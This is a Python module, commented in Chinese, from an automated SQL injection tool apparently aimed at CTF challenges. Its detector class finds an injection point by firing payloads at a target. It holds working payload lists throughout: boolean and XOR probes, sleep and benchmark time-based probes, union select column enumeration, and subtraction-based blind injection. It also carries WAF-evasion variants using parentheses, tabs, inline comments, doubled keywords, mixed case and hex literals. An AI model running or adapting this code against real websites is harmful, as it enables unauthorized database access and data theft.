"""注入点发现：闭合类型、注释符、数字型判定、列数与回显位。

多形态探针（classic/paren/inline/tab）：空格被 WAF 过滤时自动切换
括号法等无空格形式（ctfshow 类 "and 可用但带空格即拦" 的环境）。
"""
from __future__ import annotations

from typing import List, Optional

from .models import InjectionPoint, ResponseInfo, similarity
from .session import HttpSession
from ..tampers import apply_form, form_sep, mixed_case

MARKER_PREFIX = "asq"          # 回显位标记前缀，尽量避开常见词

# (形态名, 恒真核心, 恒假核心)——and 适用查询框，or 适用登录框（恒真=登录成功）
# orinject：关键字被 str_replace 剥离的环境（BabySQL），oorr 双写还原
# xor：and/or/空格/注释全被滤的异或盲注（FinalSQL：1^(1=1) 真→id 变化）
BOOL_FORMS = [
    ("classic", " and 1=1", " and 1=2"),
    ("paren",   "and(1=1)", "and(1=2)"),
    ("classic", " or 1=1", " or 1=2"),
    ("paren",   "or(1=1)", "or(1=2)"),
    ("inline",  "/**/and/**/1=1", "/**/and/**/1=2"),
    ("inline",  "/**/or/**/1=1", "/**/or/**/1=2"),
    ("tab",     "\tand\t1=1", "\tand\t1=2"),
    ("tab",     "\tor\t1=1", "\tor\t1=2"),
    # = 被剥离时 1=1→11 恒常量（web209 实测），like 型参照对兜底
    ("paren",   "and((1)like(1))", "and((1)like(2))"),
    ("paren",   "or((1)like(1))", "or((1)like(2))"),
    ("orinject", "oorr 1=1", "oorr 1=2"),
    ("orinject", "aornd 1=1", "aornd 1=2"),
    ("xor",     "^(1=1)", "^(1=2)"),
]


class Detector:
    def __init__(self, session: HttpSession):
        self.s = session
        self.log = session.log
        self.R_base: Optional[ResponseInfo] = None
        self.R_err: Optional[ResponseInfo] = None
        self.form = "classic"

    # ------------------------------------------------------------------ utils
    def _send(self, value: str) -> ResponseInfo:
        return self.s.request_value(value)

    def _same_as_base(self, r: ResponseInfo, threshold: float = 0.98) -> bool:
        return similarity(r, self.R_base) >= threshold and r.status_code == self.R_base.status_code

    # ------------------------------------------------------------------ main
    def analyze(self) -> Optional[InjectionPoint]:
        self.inj_result: Optional[InjectionPoint] = None
        inj = self._analyze()
        self.inj_result = inj
        return inj

    def _analyze(self) -> Optional[InjectionPoint]:
        spec = self.s.spec
        self.R_base = self._send(spec.base_value)
        if self.R_base.status_code < 0:
            self.log("ERROR", "基线请求失败，请检查目标 URL / 登录配置")
            return None
        self.log("INFO", f"基线响应: {self.R_base.status_code}, {self.R_base.length}B")
        if self.R_base.status_code == 404:
            # 快速失败：入口路径不存在（ctf.show 换题后仍用旧链接的典型症状）
            self.log("ERROR", f"入口 404（{self.R_base.length}B）：URL 路径不对或容器已回收，"
                              "先确认题目入口再探测")
            return None

        inj = InjectionPoint(param=spec.param, base_value=spec.base_value)
        # 数字型优先（medium 类转义环境下引号闭合会造成误判）
        if self._probe_numeric():
            inj.closure = ""
            inj.numeric = True
        else:
            closure = self._probe_closure()
            if closure is not None:
                inj.closure = closure
                inj.numeric = False
            else:
                # 兜底：WAF 只放行 union、把 and/or 与报错全掐死时（web203），
                # 布尔/报错两条路都走不通，直接 union 试闭合+列数+回显
                uni = self._probe_union_first()
                if uni is not None:
                    return uni
                tj = self._probe_time_first()
                if tj is not None:
                    return tj
                self.log("WARN", "未发现明显注入点（闭合探测无 SQL 报错，数字型布尔无差异，union 无回显）")
                return None
        inj.form = self.form

        if self.form == "arith":
            # 减法盲注：尾部用 -' 引号闭合（替代被滤的 #/--），列数/回显探测
            # 依赖 union+逗号（此形态下通常被滤）无意义，全部跳过。
            # 基线形态实测二选一（web209 实测）：数值列（id=expr 只匹配等值行）
            # 必须保留数字基线才有两态；字符串列（username=0 即全表态）需换
            # 非数字基线 'asq'（数值化 0）。用 'asq' 对子探测哪种语义成立。
            inj.comment = "minus-close"
            t = self._send(f"asq{inj.closure}-0-'")
            f = self._send(f"asq{inj.closure}-1-'")
            if self._differs(t, f):
                inj.base_value = MARKER_PREFIX
                self.log("INFO", "减法盲注形态：尾部用 -' 引号闭合替代注释符，"
                                 "基线='asq'（字符串列语义：0=全表态）")
            else:
                self.log("INFO", "减法盲注形态：尾部用 -' 引号闭合替代注释符，"
                                 f"基线保留 {inj.base_value!r}"
                                 "（数值列语义：id=基线-expr）")
            return inj

        # form 升级：classic 失效（关键字剥离/空格过滤）时按多形态重找可用恒真
        # （报错法命中闭合的场景 form 仍是 classic，WAF 剥离下 and/or 全灭）
        self._upgrade_form(inj)
        inj.form = self.form

        comment = self._probe_comment(inj)
        inj.comment = comment
        self._probe_bool(inj)
        self._probe_columns(inj)
        return inj

    def _upgrade_form(self, inj: InjectionPoint):
        """验证当前 form 是否有真假差异；没有则遍历 BOOL_FORMS 升级。"""
        pre = inj.base_value if inj.numeric else inj.base_value + inj.closure
        for form, t_core, f_core in BOOL_FORMS:
            tail = "" if inj.numeric else "#"
            t = self._send(f"{pre}{t_core}{tail}")
            f = self._send(f"{pre}{f_core}{tail}")
            if t.status_code < 0 or f.status_code < 0:
                continue
            if self._differs(t, f) and \
                    (self._same_as_base(t, 0.98) or self._same_as_base(f, 0.98)):
                if form != inj.form:
                    self.log("INFO", f"形态升级: {inj.form} → {form}"
                                     f"（{t_core.strip()[:10]} 真假差异确认）")
                    inj.comment = "#"
                self.form = form
                return

    def _probe_time_first(self) -> Optional[InjectionPoint]:
        """时间盲注兜底（web214 类：无回显、无布尔差异，仅延时两态）。"""
        import time as _t
        base = self.s.spec.base_value or "1"
        t0 = _t.perf_counter()
        self._send(base)
        if _t.perf_counter() - t0 > 2.5:
            return None                     # 基线已慢，无延时差异可言
        probes = [
            ("", f"{base} or sleep(4)#"),
            ("'", f"{base}'or sleep(4)#"),
            (")", f"{base})or(sleep(4))#"),
            ("", f"{base} xor sleep(4)#"),
            ("'", f"{base}'xor sleep(4)#"),
            (")", f"{base})xor(sleep(4))#"),
            ("", f"{base} and sleep(4)#"),
            ("'", f"{base}'and sleep(4)#"),
            (")", f"{base})and(sleep(4))#"),
            # sleep 被目标拦（web217）→ benchmark 变体（迭代数压在请求超时内）
            ("", f"{base} or benchmark(1000000,md5(0x616263))#"),
            ("'", f"{base}'or benchmark(1000000,md5(0x616263))#"),
            (")", f"{base})or(benchmark(1000000,md5(0x616263)))#"),
        ]
        for closure, payload in probes:
            if self.s.stopped:
                return None
            t0 = _t.perf_counter()
            r = self._send(payload)
            dt = _t.perf_counter() - t0
            if r.status_code < 0:
                # 请求超时本身即延时证据：benchmark 类长延时会把读超时撑爆
                if dt >= 3.5 and "timed out" in str(r.body).lower():
                    pass
                else:
                    continue
            elif dt < 3.5:
                continue
            inj = InjectionPoint(param=self.s.spec.param, base_value=base,
                                 numeric=(closure == ""), closure=closure)
            inj.comment = "#"
            inj.form = "classic"
            self.form = "classic"
            self.log("INFO", f"时间盲注兜底命中（闭合 {closure!r}）：延时 {dt:.1f}s")
            self.s.record_step(
                "确认注入点（时间盲注）", payload,
                f"无回显/布尔差异，{closure or '数字型'} + sleep 延时 "
                f"{dt:.1f}s 确认注入")
            return inj
        return None

    # ------------------------------------------------------------------ closure
    def _probe_union_first(self) -> Optional[InjectionPoint]:
        """union 优先的闭合探测（WAF 只放过 union 时唯一可行的一条路）。

        对每个候选闭合/注释/列数直接发 `union select 9137,9150,...`，
        回显里出现这些独特数字即说明：闭合正确、列数正确、该列可回显。
        空格被滤时 classic 全灭（web209 连 /**/ 都被 * 封死），故外层按
        形态循环 classic → tab → tab+大小写混淆 → paren → …，命中即把
        inj.form 定成对应形态，后续构造统一走同一条变换链。tab+mixed 专治
        str_replace('select','') 类大小写敏感剥离（web209 实测正解）。
        """
        base = self.s.spec.base_value or "1"
        for mode in ("classic", "tab", "tab-mixed", "paren", "paren-mixed",
                     "inline"):
            base_mode = mode.split("-")[0]
            for suffix in ("'", '"', "", ")", "')", '")'):
                for cols in (2, 3, 4, 5):
                    nums = [str(9137 + i * 13) for i in range(cols)]
                    core = apply_form(f"union select {','.join(nums)}", base_mode)
                    if mode.endswith("-mixed"):
                        core = mixed_case(core)
                    sep = form_sep(base_mode) if suffix == "" else ""
                    for tail in ("#", "-- "):
                        payload = f"{base}{suffix}{sep}{core}{tail}"
                        r = self._send(payload)
                        if r.status_code < 0:
                            continue
                        hits = [i + 1 for i, n in enumerate(nums) if n in r.body]
                        if not hits:
                            continue
                        inj = InjectionPoint(param=self.s.spec.param,
                                             base_value=base,
                                             closure=suffix, numeric=(suffix == ""))
                        inj.comment = tail.strip()
                        inj.column_count = cols
                        inj.echo_positions = hits
                        inj.form = base_mode
                        self.form = base_mode
                        self.log("INFO", f"union 优先探测命中（形态 {mode}）："
                                         f"闭合 {suffix!r}，{cols} 列，回显位 {hits}")
                        self.s.record_step(
                            "确认注入点（union 回显）",
                            payload,
                            f"and/or/报错均不可用时，union（{mode} 形态）直接"
                            f"确认闭合 {suffix!r}、{cols} 列、回显位 {hits}")
                        return inj
        return None

    def _probe_closure(self) -> Optional[str]:
        """逐一试探引号类闭合：
        1) 报错法：suffix 引发 SQL 报错即命中；
        2) 布尔法（LIMIT 拼接等环境下 1' 合法不报错）：
           1{suffix} and 1=1# 与 1=2 页面有差异即命中；
        3) 减法布尔法（and/or/union/#/--/逗号/空格全被滤的登录框）。"""
        for suffix in ("'", '"', "')", '")', "`"):
            r = self._send(self.s.spec.base_value + suffix)
            if r.has_sql_error():
                self.R_err = r
                self.log("INFO", f"命中闭合: {suffix!r}（SQL 报错回显）")
                return suffix
            if r.has_waf_block():
                self.log("WARN", f"探测 {suffix!r} 时疑似被 WAF 拦截")
        # 保存一个"无报错"参照（供 WAF 扫描使用）
        self.R_err = self._send(self.s.spec.base_value + "'")

        # 布尔确认兜底（多形态：空格被滤时 classic 全灭，需试括号/tab/内联；
        # 登录框语义下 and 不产生差异，or 恒真=登录成功页；
        # 尾部注释双候选：# 仅 MySQL，-- 通用 SQLite/PG）
        for suffix in ("'", "')"):
            for form, t_core, f_core in BOOL_FORMS:
                for tail in ("#", "-- "):
                    t = self._send(f"{self.s.spec.base_value}{suffix}{t_core}{tail}")
                    f = self._send(f"{self.s.spec.base_value}{suffix}{f_core}{tail}")
                    if t.status_code < 0 or f.status_code < 0:
                        continue
                    # 判定：真假页有差异，且其中一方回归基线（and:真=基线；or:假=基线）
                    if self._differs(t, f) and                             (self._same_as_base(t, 0.98) or self._same_as_base(f, 0.98)):
                        self.log("INFO", f"命中闭合: {suffix!r}（布尔差异确认，形态={form}，"
                                         f"核心={t_core.strip()[:12]}，注释={tail!r}）")
                        self.s.record_step(
                            "确认注入点（布尔差异）",
                            f"{self.s.spec.base_value}{suffix}{t_core}{tail}",
                            f"恒真与恒假页面不同 → 参数 {self.s.spec.param!r} 可注入，"
                            f"闭合 {suffix!r}，payload 形态={form}")
                        self.form = form
                        return suffix
                continue
        return self._probe_arith()

    def _probe_arith(self) -> Optional[str]:
        """减法布尔盲注（「都过滤了」类登录框）：and/or/union/#/--/逗号/空格
        全被滤、但 - = ( ) 引号可用时，'-expr-'' 是仅存的布尔通道。
        非数字字符串数值化为 0：表达式=0 匹配全部用户（密码错误页），
        ≠0 无匹配（用户名错误页）。基线值数字 v 时 v-0 与 v-1 互补两态。"""
        for suffix in ("'", '"'):
            t = self._send(f"{self.s.spec.base_value}{suffix}-0-'")
            f = self._send(f"{self.s.spec.base_value}{suffix}-1-'")
            if t.status_code < 0 or f.status_code < 0:
                continue
            if self._differs(t, f) and                     (self._same_as_base(t, 0.98) or self._same_as_base(f, 0.98)):
                self.log("INFO", f"命中闭合: {suffix!r}（减法布尔两态确认："
                                 f"{suffix}-0- 与 {suffix}-1- 页面不同）")
                self.s.record_step(
                    "确认注入点（减法布尔盲注）",
                    f"{self.s.spec.base_value}{suffix}-0-'",
                    f"'xxx'-expr-'' 使 WHERE 变为数值比较：表达式为 0 匹配全部用户"
                    f"（→密码错误页），非 0 无匹配（→用户名错误页）。"
                    f"and/or/空格/注释符全被滤时唯一可用的布尔通道")
                self.form = "arith"
                return suffix
        return None

    def _probe_numeric(self) -> bool:
        """数字型判定：and 1=1 / and 1=2 页面差异（多形态，空格被滤时用 inline/paren/tab）。"""
        for form, t_core, f_core in BOOL_FORMS:
            if t_core.lstrip().lower().startswith(("or", "oorr")):
                continue    # 数字型判定用 and/xor 语义（真=基线或翻转）
            # 数字型表达式自然结束，无需注释符（FinalSQL 类 # 被滤环境）
            # 尾部双候选：空尾自然结束 + # / -- 注释（部分后端拼有尾随内容）
            for tail in ("", "#", "-- "):
                t = self._send(f"{self.s.spec.base_value}{t_core}{tail}")
                f = self._send(f"{self.s.spec.base_value}{f_core}{tail}")
                if t.status_code < 0 or f.status_code < 0:
                    continue
                if not self._differs(t, f):
                    continue
                # and 语义真=基线；or 语义假=基线（恒假回落原行），任一成立即可
                if self._same_as_base(t, 0.9) or self._same_as_base(f, 0.98):
                    self.log("INFO", f"数字型注入确认（形态={form}，{t_core.strip()[:8]} 真假差异）")
                    self.s.record_step(
                        "确认注入点（数字型布尔差异）",
                        f"{self.s.spec.base_value}{t_core}{tail}",
                        f"参数 {self.s.spec.param!r} 为数字型注入（无需引号闭合），形态={form}")
                    self.form = form
                    return True
                continue
            continue
        return False

    @staticmethod
    def _differs(a: ResponseInfo, b: ResponseInfo) -> bool:
        return similarity(a, b) < 0.995 or a.status_code != b.status_code

    # ------------------------------------------------------------------ comment
    def _form_cores(self, inj: InjectionPoint):
        """当前形态对应的恒真/恒假核心（xor 等 joiner 特化）。"""
        rows = [(t, f) for fm, t, f in BOOL_FORMS if fm == inj.form]
        if rows:
            return rows[0]
        return (" and 1=1", " and 1=2")

    def _probe_comment(self, inj: InjectionPoint) -> str:
        """探测尾部处理方式，返回最优 comment（含 quote-close / none）。
        none：数字型 + 表达式自然自闭合（FinalSQL 类 # 被滤环境）。"""
        base = inj.base_value
        pre = base if inj.numeric else base + inj.closure
        t_core, f_core = self._form_cores(inj)
        candidates = [
            ("#", "#"),
            ("-- ", "-- "),
            ("none", ""),          # 无注释（数字型表达式自然结束）
            ("quote-close", None),  # 引号闭合（仅字符串型）
        ]
        for name, tail in candidates:
            if name == "quote-close":
                if inj.numeric:
                    continue
                core_t = " or '1'='1"
                core_f = " or '1'='2"
                payload = f"{pre}{apply_form(core_t, inj.form)}"
                payload_f = f"{pre}{apply_form(core_f, inj.form)}"
            else:
                payload = f"{pre}{apply_form(t_core, inj.form)}{tail}"
                payload_f = f"{pre}{apply_form(f_core, inj.form)}{tail}"
            t = self._send(payload)
            f = self._send(payload_f)
            if t.status_code < 0 or f.status_code < 0:
                continue
            if self._same_as_base(t, 0.9) and self._differs(t, f):
                self.log("INFO", f"注释/收尾方式可用: {name!r}")
                return name
        # or 变体再试（and 可能被过滤）
        if not inj.numeric:
            for name in ("#", "quote-close"):
                core_or = " or 1=1#" if name == "#" else " or '1'='1"
                for form in [inj.form]:
                    payload = f"{pre}{apply_form(core_or, form)}"
                    t = self._send(payload)
                    f = self._send(payload.replace("1=1", "1=2").replace("'1'='1", "'1'='2"))
                    if t.status_code > 0 and not self._same_as_base(t, 0.95) \
                            and self._differs(t, f):
                        self.log("INFO", f"注释/收尾方式可用(and被滤，or验证): {name!r}")
                        return name
        self.log("WARN", "未找到可用注释符，默认使用 #（可能需要手工调整）")
        return "#"

    def _probe_bool(self, inj: InjectionPoint):
        """记录布尔差异标记，供盲注使用。"""
        pre = inj.base_value if inj.numeric else inj.base_value + inj.closure
        tail = inj.comment if inj.comment not in ("quote-close", "none") else ""
        t = self._send(f"{pre}{apply_form(' and 1=1', inj.form)}{tail}")
        f = self._send(f"{pre}{apply_form(' and 1=2', inj.form)}{tail}")
        inj.bool_markers = {"true_len": t.length, "false_len": f.length,
                            "true_status": t.status_code, "false_status": f.status_code}

    # ------------------------------------------------------------------ union
    def _probe_columns(self, inj: InjectionPoint):
        """列数 + 回显位。
        classic：ORDER BY 二分（成功/失败双参照最近邻，兼容空报错页）；
        paren/tab/inline：UNION 列数枚举法（逐列 marker，命中即得列数与回显位）。"""
        if inj.form == "classic":
            self._columns_by_orderby(inj)
        if inj.column_count:
            return
        self._columns_by_union_enum(inj)

    def _columns_by_orderby(self, inj: InjectionPoint):
        pre = f"{inj.base_value}{inj.closure}"
        r_ok = self._send(f"{pre} order by 1{inj.comment}")
        r_bad = self._send(f"{pre} order by 999{inj.comment}")
        if r_ok.status_code < 0 or similarity(r_ok, r_bad) > 0.99:
            return          # 页面对 order by 成败无区分度
        is_err = lambda r: similarity(r, r_bad) >= similarity(r, r_ok)

        lo, hi, good = 1, 40, 0
        while lo <= hi:
            mid = (lo + hi) // 2
            r = self._send(f"{pre} order by {mid}{inj.comment}")
            if r.status_code > 0 and not is_err(r) and not r.has_waf_block():
                good, lo = mid, mid + 1
            else:
                hi = mid - 1
        if good == 0:
            return
        inj.column_count = good
        self.log("INFO", f"ORDER BY 探测列数: {good}")
        self._find_echo_positions(inj)

    def _columns_by_union_enum(self, inj: InjectionPoint):
        """UNION 列数枚举：n=1..15，每列放独立 marker，页面出现即命中。
        marker 双形式：引号版（默认）失败后自动换十六进制版（单引号被滤时）；
        再失败尝试大小写混淆（select 被大小写敏感过滤时，c.f. web176）。"""
        from ..tampers import apply_form, mixed_case, to_hex_literal
        pre = f"0{inj.closure}" if not inj.numeric else "0"
        if not inj.closure:
            pre += form_sep(inj.form) if inj.form != "classic" else " "
        for literal in ("quote", "hex", "mixed"):
            for n in range(1, 16):
                if self.s.stopped:
                    return
                markers = self._echo_markers(n)
                if literal == "quote":
                    cols = ",".join(f"'{m}'" for m in markers)
                else:
                    cols = ",".join(to_hex_literal(m) for m in markers)
                payload = f"{pre}{apply_form(f'union select {cols}', inj.form)}{inj.comment}"
                if literal == "mixed":
                    payload = mixed_case(payload)
                r = self._send(payload)
                # 报错页会把 payload 原文回显在 near '...' 中，必须排除
                if r.status_code > 0 and not r.has_sql_error():
                    pos = [i + 1 for i, m in enumerate(markers) if m in r.body]
                    if pos:
                        inj.column_count = n
                        inj.echo_positions = pos
                        self.log("INFO", f"UNION 枚举列数: {n}，回显位: 第 {pos} 列"
                                         f"（marker={literal}）")
                        return

    @staticmethod
    def _echo_markers(n: int) -> list:
        """回显位标记：字母-only（asqaaa/asqbbb/...）。
        部分靶场按行过滤回显——含数字的联合行会被整个吞掉（ctf.show web174），
        数字标记（asq01x7）会让回显位探测全灭。"""
        return [f"{MARKER_PREFIX}{chr(97 + i % 26) * 3}" for i in range(n)]

    def _find_echo_positions(self, inj: InjectionPoint):
        from ..tampers import mixed_case, to_hex_literal
        markers = self._echo_markers(inj.column_count)
        for lit in ("quote", "hex", "mixed"):
            if lit == "quote":
                cols = ",".join(f"'{m}'" for m in markers)
            else:
                cols = ",".join(to_hex_literal(m) for m in markers)
            r = self._send(f"0{inj.closure} union select {cols}{inj.comment}")
            if lit == "mixed":
                r = self._send(mixed_case(
                    f"0{inj.closure} union select {cols}{inj.comment}"))
            # 报错页会把 payload 原文回显在 near '...' 中，必须排除
            if r.status_code > 0 and not r.has_sql_error():
                pos = [i + 1 for i, m in enumerate(markers) if m in r.body]
                if pos:
                    inj.echo_positions = pos
                    self.log("INFO", f"回显位: 第 {pos} 列（marker={lit}）")
                    return
